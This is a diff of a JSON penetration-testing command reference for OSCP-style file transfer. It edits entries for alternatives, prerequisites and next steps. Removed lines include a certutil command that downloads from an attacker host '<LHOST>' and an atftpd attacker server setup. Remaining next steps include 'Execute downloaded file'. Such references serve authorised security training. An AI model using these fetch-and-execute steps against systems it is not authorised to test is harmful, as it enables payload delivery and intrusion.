@@ -22,7 +22,6 @@
         "file-transfer"
       ],
       "alternatives": [
-        "python3 -m http.server <PORT>",
         "ruby-http-server"
       ],
       "next_steps": [
@@ -54,7 +53,6 @@
         "file-transfer"
       ],
       "alternatives": [
-        "python3 -m http.server <PORT>",
         "php-http-server"
       ],
       "next_steps": [
@@ -100,9 +98,7 @@
         "file-transfer",
         "upload"
       ],
-      "prerequisites": [
-        "SSH access to target"
-      ],
+      "prerequisites": [],
       "next_steps": [
         "chmod +x on uploaded file",
         "Execute"
@@ -151,37 +147,9 @@
         "file-transfer",
         "download"
       ],
-      "prerequisites": [
-        "SSH access to target"
-      ],
+      "prerequisites": [],
       "next_steps": [
         "Analyze downloaded file"
-      ]
-    },
-    {
-      "id": "ftp-connect",
-      "name": "FTP - Connect",
-      "description": "Connect to FTP server",
-      "command": "ftp <TARGET>",
-      "category": "file-transfer",
-      "subcategory": "ftp",
-      "variables": [
-        {
-          "name": "<TARGET>",
-          "description": "Target IP",
-          "example": "192.168.1.1",
-          "required": true
-        }
-      ],
-      "tags": [
-        "oscp",
-        "ftp",
-        "file-transfer"
-      ],
-      "next_steps": [
-        "get <FILE> (download)",
-        "put <FILE> (upload)",
-        "binary (set binary mode)"
       ]
     },
     {
@@ -211,9 +179,7 @@
         "file-transfer",
         "windows"
       ],
-      "prerequisites": [
-        "TFTP server running on attacker: atftpd --daemon --port 69 /tftp"
-      ],
+      "prerequisites": [],
       "next_steps": [
         "Verify file transfer"
       ],
@@ -293,9 +259,7 @@
         "file-transfer",
         "download"
       ],
-      "prerequisites": [
-        "HTTP server running on attacker"
-      ],
+      "prerequisites": [],
       "next_steps": [
         "Execute downloaded file"
       ],
@@ -340,8 +304,7 @@
         "download"
       ],
       "alternatives": [
-        "powershell-invoke-webrequest",
-        "certutil -urlcache -f http://<LHOST>/<FILE> <DEST>"
+        "powershell-invoke-webrequest"
       ],
       "next_steps": [
         "Execute downloaded file"
@@ -381,9 +344,7 @@
         "file-transfer",
         "download"
       ],
-      "prerequisites": [
-        "HTTP server on attacker"
-      ],
+      "prerequisites": [],
       "next_steps": [
         "Execute downloaded file"
       ],
